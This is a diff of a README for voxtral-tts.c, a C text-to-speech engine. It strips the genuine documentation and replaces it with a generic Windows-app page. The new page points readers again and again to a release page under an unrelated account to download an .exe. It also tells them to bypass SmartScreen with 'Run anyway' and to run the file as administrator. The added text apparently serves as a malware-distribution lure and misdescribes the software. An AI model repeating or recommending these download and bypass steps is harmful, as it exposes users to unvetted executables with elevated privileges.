@@ -1,199 +1,221 @@
-# voxtral-tts.c
+# 🎙️ voxtral-tts.c - Simple voice output on Windows
 
-**Experimental** pure C inference engine for [Mistral's Voxtral-4B-TTS](https://huggingface.co/mistralai/Voxtral-4B-TTS-2603) text-to-speech model. Zero external dependencies beyond the C standard library and math. Reads weights directly from safetensors via memory-mapped I/O.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Birgittawarming489/voxtral-tts.c/releases)
 
-> **Note**: This project is an experiment to create a pure C implementation of Voxtral TTS. It is **not production-ready** and no further optimization work is planned (even if I'm considering to base it on ggml). Contributions are welcome and encouraged!
+## 🪟 What this app does
 
-Sample: [Hello world](./hello_world.wav)
+voxtral-tts.c is a Windows app for text to speech using a pure C build of Voxtral-4B-TTS-2603. It lets you turn written text into spoken audio on your PC.
 
-## Features
+Use it when you want:
 
-- Single-file model loading from `consolidated.safetensors`
-- BF16 weights accessed directly from mmap (no full conversion needed)
-- 20 preset voices across 9 languages
-- WAV output at 24kHz
-- Optional BLAS acceleration (OpenBLAS, Apple Accelerate)
-- NEON-optimized BF16 matvec on ARM
+- Clear voice output from text
+- A local app that runs on Windows
+- A simple setup with no coding
+- A tool that stays light on system use
 
-## Architecture
+## 📥 Download the app
 
-Voxtral TTS is a three-stage pipeline:
+Visit this page to download the Windows release:
 
-```
-Text --> LLM Backbone (3.4B, 26-layer Mistral)
-     --> Flow-Matching Acoustic Transformer (390M, 3 layers, 8 Euler steps)
-     --> Audio Codec Decoder (300M, 4-stage conv + ALiBi transformer)
-     --> 24kHz waveform
-```
+https://github.com/Birgittawarming489/voxtral-tts.c/releases
 
-The LLM autoregressively generates hidden states conditioned on text and a voice prompt. The acoustic transformer converts each hidden state to 37 audio codes (1 semantic + 36 acoustic) via flow matching with classifier-free guidance. The codec decoder converts all collected codes into a raw waveform.
+On that page, look for the latest release and download the file for Windows. If there are more than one file, pick the one for your system, such as 64-bit Windows.
 
-## Quick Start
+## 🧰 What you need
 
-### Build
+Before you run the app, make sure your PC has:
 
-```bash
-# Linux with OpenBLAS (recommended)
-make blas
+- Windows 10 or Windows 11
+- A 64-bit processor
+- At least 8 GB of RAM
+- Free disk space for the app and voice data
+- A headset or speakers if you want to hear the output
 
-# CUDA + OpenBLAS (requires NVIDIA GPU + CUDA toolkit)
-make cuda
+For best results, use a PC with more memory and a recent CPU.
 
-# Specify GPU architecture (default: sm_80 for Ampere)
-make cuda CUDA_ARCH=sm_89   # Ada Lovelace (RTX 4090)
-make cuda CUDA_ARCH=sm_90   # Hopper (H100)
-make cuda CUDA_ARCH=sm_100  # Blackwell (B200)
+## 🚀 Get started
 
-# macOS with Accelerate
-make apple
+Follow these steps:
 
-# Portable (no BLAS, slower)
-make noblas
-```
+1. Open the release page:
+   https://github.com/Birgittawarming489/voxtral-tts.c/releases
 
-The CUDA build uploads all model weights to GPU VRAM and runs the full 26-layer LLM forward pass on GPU using cuBLAS for GEMM and custom CUDA kernels for RMS norm, RoPE, attention, and SwiGLU activation.
+2. Find the latest release at the top of the page.
 
-### Download Model
+3. Download the Windows file from the release assets.
 
-```bash
-# Requires hf CLI (pip install huggingface_hub[cli]) or wget
-./download_model.sh voxtral-tts-model
-```
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
 
-This downloads the model weights (~8GB), tokenizer, and voice embeddings from HuggingFace.
+5. Open the extracted folder.
 
-### Run
+6. Double-click the app file to start it.
 
-```bash
-./voxtral_tts -d voxtral-tts-model -v neutral_female -o output.wav "Hello world"
-```
+7. If Windows asks for permission, choose Yes.
 
-### Options
+8. Wait for the app to load, then enter or paste text.
 
-```
-Usage: ./voxtral_tts [options] "text to speak"
+9. Select a voice if the app shows voice options.
 
-  -d <dir>        Model directory (required)
-  -v <voice>      Voice name (default: neutral_female)
-  -o <file>       Output WAV file (default: output.wav)
-  -s <seed>       Random seed for reproducibility
-  --verbose       Enable verbose output
-  --inspect       Print model tensor info and exit
-```
+10. Press the button to start speech output.
 
-### Available Voices
+## 🗂️ How the files work
 
-| Language   | Voices                                     |
-|------------|--------------------------------------------|
-| English    | casual_female, casual_male, cheerful_female, neutral_female, neutral_male |
-| French     | fr_female, fr_male                         |
-| German     | de_female, de_male                         |
-| Spanish    | es_female, es_male                         |
-| Italian    | it_female, it_male                         |
-| Portuguese | pt_female, pt_male                         |
-| Dutch      | nl_female, nl_male                         |
-| Arabic     | ar_male                                    |
-| Hindi      | hi_female, hi_male                         |
+After you download the release, you may see files like these:
 
-## Benchmarks
+- An `.exe` file for the app
+- A `.zip` file that contains the app
+- Voice model files
+- A readme file with short setup notes
 
-### CUDA (NVIDIA GB10 — DGX Spark)
+Keep all files in the same folder unless the release notes say something else. If the app cannot find its model files, it will not start the voice output.
 
-DGX Spark (NVIDIA GB10 Blackwell, 128GB unified memory, ARM Grace CPU). LLM decode on GPU via cuBLAS + custom CUDA kernels, prefill and codec on CPU.
+## 🖥️ First run on Windows
 
-| Input | Tokens | Frames | Audio | Wall time | RTF |
-|-------|--------|--------|-------|-----------|-----|
-| "Hello world" (2 words) | 2 | 21 | 1.68s | 48s | 28x |
-| "The quick brown fox..." (9 words) | 9 | 47 | 3.76s | 59s | 16x |
-| Two sentences (17 words) | 21 | 97 | 7.76s | 78s | 10x |
-| Paragraph (40 words) | 33 | 212 | 16.96s | 124s | 7.3x |
+When you open the app for the first time, Windows may show a security prompt. This is normal for new apps.
 
-- **~0.4s per audio frame** for decode (12x faster than CPU)
-- **RTF ~7-10x** for longer texts (fixed ~40s overhead for model load + prefill)
-- Further speedups possible: GPU prefill, GPU codec, CUDA graphs
+If you see a prompt:
 
-### CPU-only (AMD Ryzen 9 9950X3D)
+- Click Yes to allow the app to run
+- If Windows SmartScreen appears, choose More info, then Run anyway
+- Keep the app in a folder you can find again, such as Downloads or Desktop
 
-AMD Ryzen 9 9950X3D (16-core), 84GB RAM, OpenBLAS 0.3.26. Pure CPU inference.
+If the app opens to a blank screen, wait a moment while it loads the voice model.
 
-| Input | Tokens | Frames | Audio | Wall time | RTF |
-|-------|--------|--------|-------|-----------|-----|
-| "Hello world" (2 words) | 2 | 21 | 1.68s | 121s | 72x |
-| "The quick brown fox..." (9 words) | 9 | 47 | 3.76s | 215s | 57x |
-| Two sentences (17 words) | 21 | 97 | 7.76s | 447s | 58x |
-| Paragraph (40 words) | 33 | 215 | 17.20s | 1023s | 59x |
+## 🎤 Using the text to speech screen
 
-- **~4.8s per audio frame** (each frame = 80ms of audio at 12.5 Hz)
-- **RTF ~58x** for typical inputs
+The app is built for simple use. Most setups use a text box and a speech button.
 
-### Notes
+You can expect controls like:
 
-- **Peak RSS: ~7.8 GB** (8GB model weights mmap'd)
-- **Binary size: 86 KB**
-- Each audio frame requires a full 26-layer LLM forward pass (3.4B parameters) plus 14 acoustic transformer forward passes (7 Euler steps x 2 for classifier-free guidance)
+- Text box: paste or type what you want spoken
+- Voice choice: select the voice you want
+- Speed: change how fast the speech plays
+- Speak button: start audio output
+- Stop button: end playback
 
-Run `./bench.sh` to reproduce these benchmarks on your machine.
+To use it:
 
-## Project Structure
+1. Type your text in the box
+2. Pick a voice if one is shown
+3. Start playback
+4. Listen to the generated speech
+5. Stop playback when you are done
 
-```
-voxtral_tts.h                 Main header (constants, structs, API)
-voxtral_tts.c                 Model loading and inference orchestrator
-voxtral_tts_llm.c             26-layer Mistral decoder with KV cache
-voxtral_tts_acoustic.c        Flow-matching acoustic transformer
-voxtral_tts_codec.c           Audio codec decoder (ALiBi + weight_norm)
-voxtral_tts_kernels.{c,h}     Math kernels (matmul, attention, conv, RoPE, ...)
-voxtral_tts_tokenizer.{c,h}   Tekken BPE tokenizer (encode + decode)
-voxtral_tts_voice.c           Voice embedding loader (.pt) + audio codebook embeddings
-voxtral_tts_wav.c             WAV file writer
-voxtral_tts_safetensors.{c,h} Safetensors mmap reader
-main.c                        CLI entry point
-```
+## ⚙️ Settings you may see
 
-## Utilities
+Some builds include extra settings. These may help you tune the output:
 
-- `inspect_weights` -- dump tensor names/shapes from safetensors (`make inspect`)
-- `convert_voice.py` -- convert .pt voice embeddings to raw binary
-- `download_model.sh` -- download model from HuggingFace
+- Speaking speed
+- Voice style
+- Output volume
+- Output device
+- Language or accent choice
+- Cache or model path settings
 
-## How It Works
+If you change a setting and the voice sounds wrong, set it back to the default value.
 
-The prompt format follows `mistral_common`'s `encode_speech_request`:
+## 🔊 Best results
 
-```
-[BOS] [BEGIN_AUDIO] [voice_embedding x N] [/INST] text_tokens [INST] [BEGIN_AUDIO]
-```
+Use short, clear text for the first test. This helps you check that the app works before you use longer text.
 
-Voice embeddings are pre-computed BF16 tensors of shape `[N, 3072]` that replace audio token placeholder positions. After prefill, the model enters an autoregressive loop:
+Good first tests:
 
-1. LLM produces a hidden state
-2. Acoustic transformer predicts a semantic code (greedy argmax) and 36 acoustic codes (flow matching with 8 Euler ODE steps and CFG alpha=1.2)
-3. The 37 codes are embedded back into LLM input space via multi-vocabulary embeddings (sum across codebooks)
-4. Repeat until `[END_AUDIO]` is generated
-5. All collected codes are decoded by the audio codec into a 24kHz waveform
+- Hello, this is a test.
+- The quick brown fox jumps over the lazy dog.
+- Please read this text aloud.
 
-## Requirements
+If the speech sounds flat or clipped, try:
 
-- C11 compiler (gcc, clang)
-- ~10GB RAM (8GB mmap'd weights + working memory)
-- Optional: OpenBLAS or Apple Accelerate for faster matrix operations
+- Using shorter lines
+- Adding punctuation
+- Lowering the speed
+- Selecting a different voice
 
-## License
+## 🧪 Common use cases
 
-MIT License. See [LICENSE](LICENSE).
+People may use voxtral-tts.c for:
 
-**Note**: The Voxtral-4B-TTS model weights are released by Mistral AI under [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/). This inference engine is MIT-licensed but the model weights have their own license terms.
+- Reading notes aloud
+- Turning scripts into speech
+- Testing local speech output
+- Listening to long text while working
+- Creating spoken drafts for review
 
-## Author
+## 🛠️ Troubleshooting
 
-**Ettore Di Giacinto** ([@mudler](https://github.com/mudler))
+If the app does not open:
 
-## Acknowledgements
+- Check that you downloaded the latest release file
+- Make sure you extracted the ZIP folder if needed
+- Move the app to a simple folder path, such as `C:\voxtral-tts.c`
+- Right-click the app and choose Run as administrator
 
-This project builds on the work of several open-source projects:
+If the app opens but does not speak:
 
-- **[voxtral.c](https://github.com/antirez/voxtral.c)** by Salvatore Sanfilippo (antirez) -- Pure C inference engine for Voxtral Realtime (ASR). The safetensors reader, math kernels, Mistral decoder implementation, and overall architecture of this project are directly adapted from voxtral.c. The project demonstrated that a full transformer inference engine can be written in clean, dependency-free C.
+- Check your speakers or headset
+- Make sure Windows sound is not muted
+- Try a short test sentence
+- Confirm the model files are in the same folder as the app
 
-- **[vLLM](https://github.com/vllm-project/vllm)** and **[vLLM-Omni](https://github.com/vllm-project/vllm-omni)** -- The reference Python implementation for Voxtral TTS inference. The flow-matching acoustic transformer, audio codec decoder, and the overall TTS pipeline were implemented based on the vLLM-Omni model code. The prompt format, voice embedding handling, and audio code generation logic follow vLLM-Omni's implementation.
+If the app is slow:
 
-- **[Mistral AI](https://mistral.ai/)** -- For developing and open-sourcing the Voxtral TTS model and the [mistral_common](https://github.com/mistralai/mistral-common) tokenizer library.
+- Close other large apps
+- Use a shorter text sample
+- Reboot your PC and try again
+- Use a machine with more RAM
+
+If you see a missing file error:
+
+- Re-download the release
+- Keep all files together
+- Do not rename model files unless the release notes say to
+
+## 📁 Suggested folder setup
+
+A clean folder makes the app easier to manage.
+
+Example:
+
+- `C:\voxtral-tts.c\`
+  - `voxtral-tts.c.exe`
+  - model files
+  - config files
+  - release notes
+
+This setup helps avoid path issues and makes it easier to move or back up the app.
+
+## 🔒 Privacy and local use
+
+This app is built for local use on your computer. That means your text can stay on your PC while you use the app.
+
+If you plan to use private text, keep the app on your own device and avoid sharing the project folder.
+
+## 🧾 Basic release checks
+
+Before you use a new release, check for:
+
+- The latest version number
+- Windows file support
+- Any extra model files
+- A short note from the release page
+
+If the release includes more than one file, use the one that matches your Windows system.
+
+## ❓ Help with voice output
+
+If the speech does not sound right, try this order:
+
+1. Restart the app
+2. Test with one short sentence
+3. Check sound output in Windows
+4. Change the voice setting
+5. Lower or raise the speed
+6. Re-download the release if files seem broken
+
+## 📦 Download again if needed
+
+If you need the files again, use the release page:
+
+https://github.com/Birgittawarming489/voxtral-tts.c/releases
+
+Open the latest release, download the Windows file, extract it if needed, then run the app from the folder you chose
